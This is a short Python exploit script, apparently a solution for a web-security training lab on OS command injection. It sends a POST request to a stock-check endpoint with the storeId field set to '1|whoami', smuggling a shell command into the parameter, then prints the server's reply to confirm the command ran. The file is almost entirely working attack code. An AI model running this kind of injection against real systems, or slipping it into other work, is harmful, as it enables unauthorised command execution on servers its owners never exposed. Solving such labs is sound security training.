import requests
import sys

# --- Configuration ---
# Lab: OS command injection, simple case
BASE_URL = "https://0a5c00f70353e9ec805785f0001a0051.web-security-academy.net"
STOCK_PATH = "/product/stock"

def get_session(url):
    print(f"[*] Connecting to {url}...")
    session = requests.Session()
    # Visit homepage first to establish session/cookies
    session.get(url)
    return session

def exploit_cmd_injection(base_url, session):
    target_url = base_url + STOCK_PATH
    print(f"[*] Sending payload to {target_url}...")
    
    # Payload: We need 'productId' (required) and our injected 'storeId'
    # Logic: 1 | whoami
    payload = {
        "productId": "1",
        "storeId": "1|whoami"
    }
    
    # Use POST, pass payload to 'data'
    response = session.post(target_url, data=payload)
    
    # Check if we got the username
    if response.status_code == 200:
        print("[+] Response received:")
        print("-" * 30)
        # The response is usually the command output (e.g., peter-...)
        print(response.text)
        print("-" * 30)
        
        # Simple check for success
        if len(response.text) < 50 and "units" not in response.text:
             print("[SUCCESS] Potential username found above.")
    else:
        print(f"[-] Request failed: {response.status_code}")

if __name__ == "__main__":
    session = get_session(BASE_URL)
    exploit_cmd_injection(BASE_URL, session)